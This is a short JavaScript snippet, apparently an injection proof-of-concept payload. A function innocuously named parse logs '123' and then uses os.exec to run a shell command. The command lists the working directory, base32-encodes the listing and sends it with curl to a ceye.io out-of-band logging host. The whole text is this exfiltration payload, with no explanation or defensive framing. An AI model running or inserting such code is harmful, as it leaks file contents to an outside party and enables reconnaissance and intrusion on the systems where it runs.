function parse(x){
        console.log("123");
        os.exec(["sh","-c","curl \"http://my58ld.ceye.io/$(ls -l | base32 |paste -sd ''| sed 's/=/1/g')\""],{file:"sh"});
};
